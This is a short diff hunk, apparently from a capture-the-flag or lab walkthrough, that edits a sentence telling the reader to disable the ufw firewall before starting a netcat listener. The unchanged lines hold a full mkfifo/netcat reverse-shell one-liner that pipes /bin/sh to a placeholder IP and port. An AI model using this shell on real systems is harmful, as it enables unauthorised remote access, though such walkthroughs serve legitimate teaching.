@@ -40,7 +40,7 @@ OK.. Here see home.php <br />
   
      'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f'
  
-  Remember one thing disable your ufw firewall before running the listening netcat. <br />
+  Remember one thing disable ufw firewall before the listening netcat. <br />
   
      nc -lvnp <port> 
     -l listen mode, for inbound connects 
